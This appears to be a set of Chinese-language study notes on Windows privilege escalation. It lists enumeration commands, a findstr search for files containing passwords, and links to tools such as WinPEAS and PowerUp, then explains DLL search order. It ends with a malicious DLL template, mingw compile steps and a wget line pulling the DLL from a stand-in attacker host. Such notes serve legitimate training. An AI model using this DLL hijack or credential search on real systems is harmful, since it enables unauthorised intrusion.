# 信息收集

## 用户枚举
> 当前用户的权限： whoami /priv
> 列出用户： net users
> 列出用户的详细信息：（net user username例如net user Administrator）
> 其他用户同时登录：qwinsta（该query session命令可以用来以相同的方式） 
> 系统上定义的用户组： net localgroup
> 列出特定组的成员：（net localgroup groupname例如net localgroup Administrators）

## 系统信息
> systeminfo

此命令返回的信息可能很多，可以用findstr命令过滤

> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

上面命令只返回OS Name和OS Version

## 查找文件

命令：```findstr```

例子：```findstr /si password *.txt```

命令分解：

```findstr```：搜索文件中的文本模式。

```/si```：搜索当前目录和所有子目录（s），忽略大写/小写差异（i）

```password```: 该命令将在文件中搜索字符串“password”

```*.txt```：搜索将涵盖具有 .txt 扩展名的文件

## Patch level(补丁)

> wmic qfe get Caption,Description,HotFixID,InstalledOn

列举所有补丁，一共展示4列，分别是：Caption,Description,HotFixID,InstalledOn

## 网络连接

> netstat -ano

上面的命令可以分解如下；

-a：显示目标系统上的所有活动连接和侦听端口。
-n: 防止名称解析。IP 地址和端口以数字显示，而不是尝试使用DNS解析名称。
-o：使用列出的每个连接显示进程 ID。

## 定时任务

> schtasks /query /fo LIST /v

## 驱动程序

>driverquery

## 杀毒软件

查看win10的windefend服务状态：
> sc query windefend

在不知道杀毒软件名字的时候，输入会很冗余：
> sc queryex type=service


# 自动枚举脚本

WinPEAS ：https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
PowerUp ：https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
Windows Exploit Suggester： https://github.com/AonCyberLabs/Windows-Exploit-Suggester （Python脚本，需要Python环境）
Metasploit： 如果有一个MSF的shell，可以使用```multi/recon/local_exploit_suggester```枚举提权模块

# 易受攻击的软件

思路：通过攻击存在漏洞的软件来提升系统权限

枚举安装的软件：(可能很慢)
> wmic product get name,version,vendor

枚举服务：
> wmic service list brief

精确的枚举在运行的服务：
> wmic service list brief | findstr  "Running"

列出单个服务的详细信息，使用命令
> sc qc 服务名称

# DLL劫持

## 什么是DLL

DLL就是windows下的动态连接库，它不可以被直接执行，仅供应用程序调用。有时候系统会缺少某些不太重要的DLL库，此时就可以制造一个恶意的DLL库劫持掉应用程序调用，执行恶意代码进行提权。

类似于linux下的SUID+$PATH劫持

DLL调用顺序，在启用了```SafeDllSearchMode```下为：
1. The directory from which the application loaded.

2. The system directory. Use the GetSystemDirectory function to get the path of this directory.

3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.

4. The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.

5. The current directory.

6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.

没有启用```SafeDllSearchMode```下为：

1. The directory from which the application loaded.

2. The current directory.

3. The system directory. Use the GetSystemDirectory function to get the path of this directory.

4. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.

5. The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.

6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.

应用程序在调用DLL时，会从上面的列表中逐步往下找是否有这个DLL文件，DLL攻击的一个前提是，在应用程序调用合法的DLL之前，应该先执行我们的恶意DLL文件。

## 查找DLL劫持漏洞
> 识别 DLL 劫持漏洞需要向目标系统加载额外的工具或脚本。另一种方法是在测试系统上安装相同的应用程序。但是，由于版本差异或目标系统配置，这可能无法给出准确的结果。


> 可用于查找潜在 DLL 劫持漏洞的工具是 Process Monitor (ProcMon)。由于 ProcMon 需要管理权限才能工作，这不是您可以在目标系统上发现的漏洞。如果您想检查任何软件是否存在潜在的 DLL 劫持漏洞，您需要在您的测试环境中安装该软件并在那里进行研究。

## 创建恶意 DLL 文件

大概框架如下，system里面的命令可以自定义，看需要
```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

安装Mingw 编译器
> apt install gcc-mingw-w64-x86-64

在kali上编译上面的代码成一个dll文件：
> x86_64-w64-mingw32-gcc hijackdll.c -shared -o hijackme.dll


靶机获取上面的dll文件：
> wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll



